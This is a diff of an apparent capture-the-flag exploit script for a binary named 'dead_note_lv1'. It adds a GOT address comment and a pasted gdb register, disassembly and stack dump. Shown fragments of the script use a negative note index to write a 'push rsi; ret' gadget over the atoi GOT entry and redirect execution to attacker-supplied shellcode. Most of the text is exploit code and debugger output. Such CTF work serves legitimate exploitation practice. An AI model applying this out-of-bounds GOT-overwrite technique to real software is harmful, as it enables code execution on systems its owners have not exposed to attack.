@@ -28,15 +28,12 @@ print_all()
 
 elf = ELF('./dead_note_lv1')
 atoi_got = elf.got['atoi']
-print 'atoi_got: {}'.format(hex(atoi_got))
-
+print 'atoi_got: {}'.format(hex(atoi_got)) # 0x202070
 
 add_note(1, 1, 'AAA')
 
 # before calling atoi our input will be at rsi =>
 # push rsi; ret; => \x56\xc3
-
-
 add_note(-14, 1, '\x56\xc3')
 
 # read:
@@ -214,6 +211,49 @@ EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
 [------------------------------------------------------------------------------]
 Legend: code, data, rodata, value
 0x0000555555759030 in ?? ()
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x0 
+RCX: 0x7ffff7b04260 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
+RDX: 0xf 
+RSI: 0x7fffffffdc60 --> 0x48000000ffc2c748 
+RDI: 0x7fffffffdc60 --> 0x48000000ffc2c748 
+RBP: 0x7fffffffdc80 --> 0x7fffffffdc90 --> 0x555555555020 (push   r15)
+RSP: 0x7fffffffdc50 --> 0x7fffffffdc60 --> 0x48000000ffc2c748 
+RIP: 0x555555759031 --> 0xc3 
+R8 : 0x7ffff7fd9700 (0x00007ffff7fd9700)
+R9 : 0xd ('\r')
+R10: 0x0 
+R11: 0x246 
+R12: 0x555555554a60 (xor    ebp,ebp)
+R13: 0x7fffffffdd70 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x55555575902c:	add    BYTE PTR [rax],al
+   0x55555575902e:	add    BYTE PTR [rax],al
+   0x555555759030:	push   rsi
+=> 0x555555759031:	ret    
+   0x555555759032:	add    BYTE PTR [rax],al
+   0x555555759034:	add    BYTE PTR [rax],al
+   0x555555759036:	add    BYTE PTR [rax],al
+   0x555555759038:	add    BYTE PTR [rax],al
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdc50 --> 0x7fffffffdc60 --> 0x48000000ffc2c748 
+0008| 0x7fffffffdc58 --> 0x555555554c3f (mov    rdx,QWORD PTR [rbp-0x8])
+0016| 0x7fffffffdc60 --> 0x48000000ffc2c748 
+0024| 0x7fffffffdc68 --> 0x4141410a050fff31 
+0032| 0x7fffffffdc70 --> 0x555555554a60 (xor    ebp,ebp)
+0040| 0x7fffffffdc78 --> 0xa0a5bf601d8fdb00 
+0048| 0x7fffffffdc80 --> 0x7fffffffdc90 --> 0x555555555020 (push   r15)
+0056| 0x7fffffffdc88 --> 0x555555554fd2 (cmp    eax,0x2)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 2, 0x0000555555759031 in ?? ()
+
 '''
 
 
